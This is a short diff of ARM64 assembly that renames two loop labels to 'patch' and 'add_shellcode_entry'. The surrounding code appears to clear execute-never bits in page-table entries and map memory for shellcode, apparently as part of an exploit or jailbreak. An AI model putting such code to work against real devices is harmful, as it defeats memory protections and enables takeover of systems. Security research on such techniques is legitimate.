@@ -11,7 +11,7 @@ _main:
   mov        x3, #0x0
   mov        x4, #0x3ff8
 
-loc_18:
+patch:
   ldr        x1, [x2, x3]
   and        x1, x1, #0xffbfffffffffffff
   and        x1, x1, #0xffdfffffffffffff
@@ -20,11 +20,11 @@ loc_18:
   dmb        sy
   add        x3, x3, #0x8
   cmp        x3, x4
-  b.lt       loc_18
+  b.lt       patch
 
   mov        x0, #0x0
 
-loc_40:
+add_shellcode_entry:
   orr        x1, xzr, #0x180000000
   add        x1, x1, #0x627
   lsl        x3, x0, #0xe
@@ -33,7 +33,7 @@ loc_40:
   str        x1, [x2, x3]
   add        x0, x0, #0x1
   cmp        x0, #0x20
-  b.lt       loc_40
+  b.lt       add_shellcode_entry
 
   orr        x2, xzr, #0x180000000
   add        x2, x2, #0x50, lsl #12
